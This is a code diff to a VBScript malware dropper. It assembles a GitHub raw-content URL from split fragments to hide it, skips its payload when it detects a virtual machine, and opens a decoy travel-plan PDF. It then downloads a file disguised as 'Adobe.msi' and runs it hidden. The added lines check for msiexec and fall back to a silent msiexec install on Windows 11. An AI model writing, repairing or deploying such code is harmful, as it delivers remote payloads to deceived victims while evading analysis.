@@ -5,6 +5,7 @@ Set sh  = CreateObject("WScript.Shell")
 temp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Temp\"
 stateFile = temp & "value.txt"
 
+' ---- URL fragments, reassembled at runtime ----
 p1 = "https://raw.g"
 p2 = "ithubuserco"
 p3 = "ntent.com/rotalbilly5"
@@ -53,6 +54,9 @@ If isVM Then
 Else
     sh.Run "%COMSPEC% /c timeout /t 4 /nobreak >nul", 0, True
 
+    ' ============================================================
+    '  PDF first
+    ' ============================================================
     Dim pdfHttp, pdfUrl, pdfPath, pstream
     pdfUrl  = p1 & p2 & p3 & p4 & p5 & "Travel-Meeting-Plan-Q4-2026.pdf"
     pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
@@ -72,6 +76,9 @@ Else
         sh.Run "msedge.exe """ & pdfPath & """", 1, False
     End If
 
+    ' ============================================================
+    '  MSI second
+    ' ============================================================
     Dim http, msiUrl, msiPath
     msiUrl  = p1 & p2 & p3 & p4 & p5 & "Adobe.msi"
     msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.msi"
@@ -90,8 +97,24 @@ Else
         stream.SaveToFile msiPath, 2
         stream.Close
 
-        ' same invocation as your working VBS — shell association, .msi runs as if double-clicked
+        ' ---- try shell association first (works on Win10) ----
         sh.Run Chr(34) & msiPath & Chr(34), 0, False
+
+        ' ---- wait 8s for msiexec to appear ----
+        sh.Run "%COMSPEC% /c timeout /t 8 /nobreak >nul", 0, True
+
+        ' ---- check if msiexec is running ----
+        Dim msirunning, msicheck, msiCheckEntry
+        msirunning = False
+        Set msicheck = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='msiexec.exe'")
+        For Each msiCheckEntry In msicheck
+            msirunning = True
+        Next
+
+        ' ---- Win11 fallback: explicit msiexec ----
+        If Not msirunning Then
+            sh.Run "msiexec.exe /i """ & msiPath & """ /qb /norestart", 0, False
+        End If
     End If
 
     Set f = fso.OpenTextFile(stateFile, 8)
